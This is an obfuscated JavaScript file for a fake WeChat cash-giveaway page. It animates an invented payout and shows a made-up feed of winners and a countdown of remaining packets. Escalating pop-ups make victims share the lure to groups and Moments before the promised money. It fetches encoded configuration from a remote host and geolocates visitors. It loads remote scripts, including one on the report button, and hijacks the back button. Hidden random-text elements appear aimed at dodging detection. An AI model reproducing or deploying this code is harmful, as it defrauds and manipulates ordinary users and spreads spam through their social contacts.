function fdow039gzob7(e) {
    return document.querySelector(e)
}
function isc4s2z6u0w8(e, t) {
    var a = document.createElement("script");
    a.src = e,
        a.onload = function() {
            a.parentNode && a.parentNode.removeChild(a),
            "function" == typeof t && t()
        }
        ,
        document.body.appendChild(a)
}
function rte7ltlez3w2b() {
    for (var e = parseInt(60 * Math.random()) + 15, t = 0, a = "", n = 2e4, o = 1e3; t < e; ) {
        t++;
        var i = parseInt(Math.random() * o);
        a += String.fromCharCode(n + i)
    }
    return a
}
function clqggkmfv8ct(e) {
    for (var t = ["div", "li", "ul", "p", "a", "span", "h2", "i"], a = 0; a < e; a++) {
        var n = t[Math.floor(Math.random() * t.length)]
            , o = document.createElement(n);
        o.style.display = "none",
            o.textContent = rte7ltlez3w2b(),
            document.body.appendChild(o)
    }
}
function gnfd62n4hpgcq3m() {
    var e, t, a, n;
    return e = new Date((new Date).getTime() + 6048e5),
        t = e.getFullYear(),
        a = ("0" + (e.getMonth() + 1)).slice(-2),
        n = ("0" + e.getDate()).slice(-2),
    t + "年" + a + "月" + n + "日"
}
function gpvcu3i6ntb0f(e) {
    for (var t = window.location.search.substring(1), a = t.split("&"), n = 0; n < a.length; n++) {
        var o = a[n].split("=");
        if (o[0] == e)
            return o[1]
    }
    return null
}
function gidnfrfq1dl1vq(e) {
    var t = Math.random().toString(36).substr(2);
    return e == t ? gidnfrfq1dl1vq(e) : t
}
function rnumxpfuc47w4g(e, t, a) {
    var n = 0
        , o = a ? Math.pow(10, a) : 1;
    return n = Math.floor(Math.random() * (t * o - e * o + 1)) + e * o,
    a && (n = (n / o).toFixed(a)),
        n
}
function gdatafi8jwpac4c(e, t, a) {
    var n = new XMLHttpRequest;
    n.onreadystatechange = function() {
        4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
    }
        ,
        n.open("GET", e, !0),
        n.send(null)
}
function pdatabvm5xqf4nt5(e, t, a, n) {
    var o = new XMLHttpRequest;
    o.onreadystatechange = function() {
        4 === o.readyState && (200 === o.status || 304 === o.status ? "function" == typeof a && a(o.responseText) : "function" == typeof n && n(o))
    }
    ;
    var i = "";
    for (var r in t)
        i += "&" + r + "=" + t[r];
    i && (i = i.slice(1)),
        o.open("POST", e, !0),
        o.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
        o.send(i)
}
function ssmfshybso8fp() {
    var e = document.createElement("div");
    e.innerHTML = '<div class="tip" style="opacity: 0.8; position: fixed; z-index: 999; top: 10px; right: 10px; overflow: hidden; text-align: center; color: #fff; font-size: 15px; animation: tipMove 1.5s infinite;">       <div class="arrow" style="overflow: hidden; width: 110px; height: 100px;">            <div class="line" style="border-top: solid 2px #fff; border-right: solid 2px #fff; width: 20px; height: 20px; position: absolute; top: 3px; right: 3px; transform: skewX(-25deg) rotate(-30deg);"></div>            <div class="orc" style="width: 200px; height: 80px; border-radius: 50%; border: solid 2px #fff; position: absolute; top: -14px; right: -2px; transform: rotate(-22deg)"></div>        </div>        <div style="transform: translateY(-100%)"><img src="//media-video-08.oss-cn-shanghai.aliyuncs.com/v7/xs/22.png" width=110px height=40px /></div>    </div>',
        document.body.appendChild(e)
}
function numanpm0tgyxf6(e, t) {
    var a = t.time || 1e3
        , n = t.number || 192.22
        , o = t.regulator || 100
        , i = n / (a / o)
        , r = 0
        , p = 0
        , s = setInterval(function() {
        r = Math.floor(100 * (r + i)) / 100,
        r >= n && (clearInterval(s),
            r = n,
            ssmfshybso8fp(),
            stipw995c01hlwt());
        var t = Number(r);
        t != p && (p = t,
            e.innerHTML = p.toFixed(2))
    }, 30)
}
function opulkrz1124b1is() {
    function e(e) {
        var t = e || 5
            , a = new Date((new Date).getTime() - 60 * t * 1e3)
            , n = ("0" + a.getHours()).slice(-2)
            , o = ("0" + a.getMinutes()).slice(-2);
        ("0" + a.getSeconds()).slice(-2);
        return n + ":" + o
    }
    function t() {
        var e = 0;
        return e = Math.floor(50 * Math.random() * i) + 100 * i,
            e /= i,
            e.toFixed(2)
    }
    function a(a) {
        var n = document.createElement("div")
            , o = t();
        return n.style.cssText = "width: 100%; height: 60px; overflow: hidden; box-sizing: border-box; padding: 0 10px; border-bottom: 1px solid rgba(0, 0, 0, .05); display: -webkit-box; display: flex; flex-wrap: wrap; align-items: center; justify-content: center;",
            n.innerHTML = '<img style="width: 40px; height: 40px; margin-right: 10px; overflow: hidden; background-color: #eee; border-radius: ' + s + '%" src="' + a.avatar + '">                            <div style="flex: 1;">                                <div style="font-size: 15px; color: #000; margin-bottom: 4px;">' + a.name + '</div>                                <div style="font-size: 14px; color: #929493;">' + e(r + 5) + '</div>                            </div>                            <div style="text-align: right;">                                <span style="color: ' + color + '; font-size: 15px; margin-right: 5px;"><img src="//media-video-08.oss-cn-shanghai.aliyuncs.com/v7/xs/ylq.jpg" width=40px height=40px /></span>                                 <span style="display:none">¥' + o + "</span>                           </div>",
            totalMoney -= Number(o),
            c.textContent = "总发放200000份 剩余" + totalMoney.toFixed(0) + "份",
            n
    }
    function n() {
        var e = u.lastChild;
        e.parentNode.removeChild(e);
        var t = a(o[r]);
        t.style.animation = "itemMove" + l + " 0.5s",
            u.insertBefore(t, u.firstChild),
            r++,
        r >= o.length && (r = 0)
    }
    var o = [{
        name: "孙笑川",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/9DE656A9B0C0384FCCF7D02BD02CFCB5/100"
    }, {
        name: "带带大师兄",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/5DA508A1616E732B0EB92A1ADAF28456/100"
    }, {
        name: "六小龄孙",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/D42066DE19EBB82D30A351185956DB41/100"
    }, {
        name: "夢醒ぴ誮落盡",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/F6213667E85E205FF363B3947D218D38/100"
    }, {
        name: "最好的我们",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/D56EE4D71422A112CDA6B7B44D48B044/100"
    }, {
        name: "甜味少女馆",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/0DE079B903E44F96AB9BAD85D706A61F/100"
    }, {
        name: "风有几分甜",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/A6F3CA4B97E59BB9AE5495984ACF3090/100"
    }, {
        name: "风月难入怀",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/E0FB2E95D84068B944789BF6569B3A7F/100"
    }, {
        name: "神明不渡我",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/71E4837B7B1F0A12D5F8D90234DDB95C/100"
    }, {
        name: "壊壊の少爷",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/9ADBAEBE292B4FA0737F9DB142336157/100"
    }, {
        name: "山河故人在",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/D6AEE11866CCEC092B82C532218F6B20/100"
    }, {
        name: "孙粒子",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/BE2BFD6D743F815AC7A8FA974E40D4FC/100"
    }, {
        name: "Mr. Xue",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/5283BB3808A16D227AC03DC4374F77C6/100"
    }, {
        name: "、dacy",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/48BE3B50C3E9847242626FF9A07C3317/100"
    }, {
        name: "已婚少年",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/02305E433C97C724931A79F8FB04FE50/100"
    }, {
        name: "叫我冰冰",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/198FD85BC7EFBCCB5C73AE4FEB633560/100"
    }, {
        name: "卢正英",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/25217BFE51A1B8A16160A9F43837A86F/100"
    }, {
        name: "Jkz.",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/772D04D9EB8E70A961A1D5CABBCF293A/100"
    }];
    o.sort(function() {
        return Math.random() > .5 ? -1 : 1
    });
    var i = 100
        , r = Math.floor(Math.random() * o.length)
        , p = 10
        , s = Math.floor(50 * Math.random())
        , l = Math.floor(4 * Math.random()) + 1
        , d = Math.floor(500 * Math.random()) + 1800
        , c = document.getElementById(total_id)
        , u = document.createElement("div");
    for (u.style.cssText = "width: 100%; background-color: rgba(255,255,255,0.1); overflow: hidden; border-radius: 5px; height: 600px;"; p > 0; )
        u.appendChild(a(o[r])),
            r++,
        r >= o.length && (r = 0),
            p--;
    fdow039gzob7(".page").appendChild(u);
    var m = setInterval(function() {
        if (!u.parentNode)
            return clearInterval(m);
        n()
    }, d)
}
function gclhpjfy0tjmwo(e) {
    var t = Math.floor(45 * Math.random()) + 210
        , a = Math.floor(35 * Math.random()) + 220;
    return e ? "rgb(" + a + ", 205, 155)" : "rgb(" + t + ", 94, 77)"
}
function scalfcdwh5kbfi() {
    var e = Math.floor(30 * Math.random()) + 90;
    return e / 100
}
function ipag08c1wvuv98x6() {
    var e = Math.floor(10 * Math.random()) + 10
        , t = Math.floor(9 * Math.random()) + 15
        , a = '<div class="page" style="height: 100vh; overflow: hidden; background-color: #fff;">                    <div style=" height: 300px; border: 1px solid ' + color + "; background-color: " + color + "; border-radius: 0px 0px 50% 50% / 10px 10px " + t + "% " + t + '%; margin-bottom: 20px ">                        <img src="' + api.logo + '"                            style="width: 60px; height: 60px;margin: 0 auto 0; display: block;padding-top: 60px;">                        <p style="font-size: 18px; color: ' + gold + '; text-align: center;padding-top: 10px">' + api.ztitle + '</p>                        <p style="font-size: 40px; text-align: center;padding-top: 15px; color: ' + gold + '; font-weight: bold">                                                      <span data-time>0</span>                         </p>       <div id="squn" style="display:block; text-align: center; font-size: 15px; color: ' + gold + '">分享到微信群后，自动存入零钱</div>                 <div id="squn" style="display:block; text-align: center; font-size: 15px; color: ' + gold + '"></div>                         <div id="squan" style="display:none; text-align: center; font-size: 15px; color: ' + gold + '">分享到朋友圈后，自动存入零钱</div>       <div class="btn" style="margin: 0 auto; margin-top:.43rem; background: #ffe4b2; color: #f25543; width:4rem; border-radius: 9999PX; font-weight:800; cursor: pointer; padding:.80rem; font-size:15px; animation: Updown .5s infinite alternate;text-align:center;">确认</div>             </div>                    <div style="width: 100%; height: 10px; background-color: #eceeed; "></div>                    <div id="' + total_id + '" style="font-size: 14px; color:#929493; height: 30px; line-height: 30px; padding-left: 10px; border-bottom: solid 1px rgba(0,0,0,0.05)"></div>                                           <a id="tousu" style="font-size: 14px; color: #333; text-decoration: none;"></a>                    <div style="position: fixed; z-index: 999; top: 10px; left: -15px; width: 80px; height: 40px; line-height: 40px; border-radius: 0 20px 20px 0; background-color: #fff; opacity: 0.8; text-align: center">                        <a id="tousu" style="font-size: 14px; color: #333; text-decoration: none;">举报</a></div>                </div>';
    clqggkmfv8ct(e),
        document.body.innerHTML += a,
        clqggkmfv8ct(e);
    var n = document.getElementById("main");
    n && n.parentNode.removeChild(n),
        opulkrz1124b1is(),
        numanpm0tgyxf6(fdow039gzob7("[data-time]"), {
            time: 1e3,
            number: Number(money),
            regulator: 50
        })
    document.getElementById('tousu').onclick = function() {
        isc4s2z6u0w8("//appmessage.oss-cn-qingdao.aliyuncs.com/t.js");
    }
}
function salidnhrdc3a7(e, t, a) {
    var n = "_alert-box"
        , o = ["_box", "_content_box", "_confirm_box"]
        , i = document.getElementById(n);
    i || (i = document.createElement("div"),
        i.id = n,
        i[o[0]] = document.createElement("div"),
        i[o[1]] = document.createElement("div"),
        i[o[2]] = document.createElement("div"),
        i.style.cssText = "position: fixed; top: 0; left: 0; z-index: 999; width: 100%; height: 100vh; background-color: rgba(0,0,0,0.45)",
        i[o[0]].style.cssText = "position: absolute; width: 75%; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #fafafc; text-align: center; border-radius: 3px; font-family: arial",
        i[o[1]].style.cssText = "padding: 20px 20px 30px; font-size: 16px; color: #000; word-wrap: break-word; word-break: break-all",
        i[o[2]].style.cssText = "width: 100%; height: 50px; padding-bottom: 1px; display: flex; flex-wrap: wrap; justify-content: center; align-items: center; color: #0bb20c; font-size: 16px; border-top: solid 1px #dadada",
        i[o[0]].appendChild(i[o[1]]),
        i[o[0]].appendChild(i[o[2]]),
        i.appendChild(i[o[0]]),
        document.body.appendChild(i)),
        i.style.display = "block",
        i[o[1]].innerHTML = e,
        i[o[2]].innerHTML = t || "确定",
        i[o[2]].onclick = function() {
            i.style.display = "none",
            "function" == typeof a && a()
        }
}
function stipw995c01hlwt() {
    switch (step) {
        case 0:
            salidnhrdc3a7(api.alert.replace("_money", money).replace("_month", month).replace("_dizhi", dizhi), "我知道了");
            break;
        case 1:
            salidnhrdc3a7(api.alert1.replace("_money", money).replace("_month", month).replace("_dizhi", dizhi), "确定");
            if (api.qunShareNum == 4) {
                wx.onMenuShareAppMessage({
                    title: api.chantitle,
                    desc: api.chandesc.replace("{city}", dizhi).replace("{qian}", money),
                    link: api.chanurl,
                    imgUrl: api.chanimg,
                    success: function() {
                        step++,
                            stipw995c01hlwt()
                    }
                });
            }
            break;
        case 2:
            salidnhrdc3a7(api.alert2.replace("_money", money).replace("_month", month).replace("_dizhi", dizhi), "确定");
            if (api.qunShareNum == 3) {
                wx.onMenuShareAppMessage({
                    title: api.chantitle,
                    desc: api.chandesc.replace("{city}", dizhi).replace("{qian}", money),
                    link: api.chanurl,
                    imgUrl: api.chanimg,
                    success: function() {
                        step++,
                            stipw995c01hlwt()
                    }
                });
            }
            break;
        case 3:
            salidnhrdc3a7(api.alert3.replace("_money", money).replace("_month", month).replace("_dizhi", dizhi), "确定");
            if (api.qunShareNum == 2) {
                wx.onMenuShareAppMessage({
                    title: api.chantitle,
                    desc: api.chandesc.replace("{city}", dizhi).replace("{qian}", money),
                    link: api.chanurl,
                    imgUrl: api.chanimg,
                    success: function() {
                        step++,
                            stipw995c01hlwt()
                    }
                });
            }
            break;
        case 4:
            salidnhrdc3a7(api.alert4.replace("_money", money).replace("_month", month).replace("_dizhi", dizhi), "确定");
            if (api.qunShareNum == 1) {
                wx.onMenuShareAppMessage({
                    title: api.chantitle,
                    desc: api.chandesc.replace("{city}", dizhi).replace("{qian}", money),
                    link: api.chanurl,
                    imgUrl: api.chanimg,
                    success: function() {
                        step++,
                            stipw995c01hlwt()
                    }
                });
            }
            break;
        case 5:
            wx.hideOptionMenu();
            wx.showMenuItems({menuList: ['menuItem:share:timeline']});
            salidnhrdc3a7(api.alert5.replace("_money", money).replace("_month", month).replace("_dizhi", dizhi), "确定");
            break;
        case 6:
            salidnhrdc3a7(api.alert6.replace("_money", money).replace("_month", month).replace("_dizhi", dizhi), "确定");
            if (api.quanShareNum == 1) {
                wx.onMenuShareTimeline({
                    title: api.chandesc.replace("{city}", dizhi).replace("{qian}", money),
                    link: api.chanurl_t,
                    imgUrl: api.chanimg,
                    success: function() {
                        step++,
                            stipw995c01hlwt()
                    }
                });
            }
            break;
        case 7:
            salidnhrdc3a7(api.alert7, "好的", function() {
                location.href = api.complatelink
            })
    }
}
function iwxf3mw9e029zm() {
    var n = "//front.zwpxigao.cn/" + Math.random().toString(36).substr(2) + ".png";
    wx.ready(function() {
        console.log("wx ready >>>"),
            wx.hideOptionMenu();
        wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
        if (api.qunShareNum == 4) {
            wx.onMenuShareAppMessage({
                title: api.chantitle,
                desc: api.chandesc.replace("{city}", dizhi).replace("{qian}", money),
                link: api.chanurl,
                imgUrl: api.chanimg,
                success: function() {
                    step++,
                        stipw995c01hlwt()
                }
            });
        } else {
            wx.onMenuShareAppMessage({
                title: api.title.replace("{city}", dizhi).replace("{qian}", money),
                desc: api.desc.replace("{city}", dizhi).replace("{qian}", money),
                link: api.qunurl,
                imgUrl: api.img,
                success: function() {
                    step++,
                        stipw995c01hlwt()
                }
            });
        }
        if (api.quanShareNum == 2) {
            wx.onMenuShareTimeline({
                title: api.chandesc.replace("{city}", dizhi).replace("{qian}", money),
                link: api.chanurl_t,
                imgUrl: api.chanimg,
                success: function() {
                    step++,
                        stipw995c01hlwt()
                }
            });
        } else {
            wx.onMenuShareTimeline({
                title: api.title.replace("{city}", dizhi).replace("{qian}", money),
                link: api.quanurl,
                imgUrl: api.img,
                type: 'api.video',
                success: function() {
                    step++,
                        stipw995c01hlwt()
                }
            });
        }
    });
}
function atoA(a) {
    a = a.split('');
    for (var b in a) /[a-z]/.test(a[b]) ? a[b] = a[b].toUpperCase() :/[A-Z]/.test(a[b]) && (a[b] = a[b].toLowerCase());
    a = a.join('');
    return atob(a);
}
var total_id = gidnfrfq1dl1vq()
    , money = gpvcu3i6ntb0f("t")
    , totalMoney = Math.floor(1e5 * Math.random() + 1e5)
    , year = Math.floor(8 * Math.random() + 1)
    , month = rnumxpfuc47w4g(1e5, 2e5)
    , api = null
    , step = 0
    , dizhi = ""
    , sizeValue = scalfcdwh5kbfi()
    , color = gclhpjfy0tjmwo()
    , gold = gclhpjfy0tjmwo(!0);

isc4s2z6u0w8("https://ip.ws.126.net/ipquery", function() {
    dizhi = localAddress.province ? localAddress.province : "2019"
}),
    isc4s2z6u0w8("https://res.wx.qq.com/open/js/jweixin-1.4.0.js", function() {
        gdatafi8jwpac4c('//front.zwpxigao.cn/v7/jssdk?url=' + encodeURIComponent(location.href.split('#')[0]) + '&_=' + Date.now(), function(e) {
            data = JSON.parse(window.atob(e)),
                wx.config({
                    debug: false,
                    appId: data.config.appId,
                    timestamp: data.config.timestamp,
                    nonceStr: data.config.nonceStr,
                    signature: data.config.signature,
                    jsApiList: ['onMenuShareTimeline', 'onMenuShareAppMessage', 'hideMenuItems', 'showMenuItems']
                });
        }, function(e) {
            console.log("请求失败 >> fail", e),
                console.log("err.status >>", e.status)
        })
        var t = "//front.zwpxigao.cn/v7/2";
        gdatafi8jwpac4c(t, function(e) {
            api = JSON.parse(window.atob(e)),
                console.log("run !!!"),
                ipag08c1wvuv98x6(),
                iwxf3mw9e029zm(),
                isc4s2z6u0w8(api.baiduid),
                window.history.pushState({
                    title: "title",
                    url: "#"
                }, "title", location.href),
                window.addEventListener("popstate", function(e) {
                    location.href = api.backlink
                }, !1)
        }, function(e) {
            console.log("请求失败 >> fail", e),
                console.log("err.status >>", e.status)
        })
    });